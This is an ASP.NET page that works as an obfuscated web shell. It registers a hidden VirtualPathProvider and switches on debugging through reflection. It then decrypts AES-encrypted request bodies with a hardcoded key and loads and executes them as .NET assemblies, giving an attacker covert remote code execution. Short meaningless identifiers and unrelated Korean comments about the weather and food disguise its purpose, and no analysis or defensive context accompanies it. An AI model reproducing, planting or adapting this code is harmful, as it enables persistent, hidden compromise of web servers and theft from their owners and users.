<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Web.Hosting" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Web" %>
<script runat="server" language="c#">
public void Page_Load(){var t=typeof(System.Web.Compilation.BuildManager);var p=t.GetProperty("DebuggingEnabled",BindingFlags.Static|BindingFlags.NonPublic);if(p!=null){try{p.SetValue(null,true);}catch{}}HostingEnvironment.RegisterVirtualPathProvider(new a());}
public class a:VirtualPathProvider{
private byte[] aa(Stream s){byte[] b=new byte[s.Length];s.Read(b,0,b.Length);return b;}
private byte[] ab(byte[] d){byte[] k=new byte[16];for(int i=0;i<16;i++){k[i]=(byte)("ca63457538b9b1e0"[i]);};var r=new RijndaelManaged();r.Key=k;r.IV=k;r.Mode=CipherMode.CBC;r.Padding=PaddingMode.PKCS7;var t=r.CreateDecryptor(r.Key,r.IV);byte[] y;using(var m=new MemoryStream(d))using(var c=new CryptoStream(m,t,CryptoStreamMode.Read))using(var p=new MemoryStream()){c.CopyTo(p);y=p.ToArray();}return y;}
private void ac(byte[] y,HttpContext c){var a=Assembly.Load(y);if(a!=null){var i=a.CreateInstance(new string('K',1));if(i!=null)i.Equals(c);}}
public override string GetCacheKey(string v){try{HttpContext c=HttpContext.Current;if(c!=null&&c.Request!=null&&c.Request.Cookies.Count>0){Stream s=c.Request.InputStream;if(s.Length>0){s.Position=0;Action<HttpContext> x=(ctx)=>{byte[] b=aa(s);byte[] y=ab(b);ac(y,ctx);ctx.Response.End();};x(c);}}}catch{}return Previous.GetCacheKey(v);}
// 오늘 날씨가 좋네요
public override bool FileExists(string v){v=v.ToLower();if(v.Contains("w"))return true;return Previous.FileExists(v);}
// 배고파요, 치킨 먹고 싶다
public override VirtualFile GetFile(string v){v=v.ToLower();if(v.Contains("w"))return new b(v);return Previous.GetFile(v);}}
public class b:VirtualFile{private string p;public b(string v):base(v){p=v;}
// 이 코드는 이해하기 어렵습니다
public override Stream Open(){return new MemoryStream();}}
</script>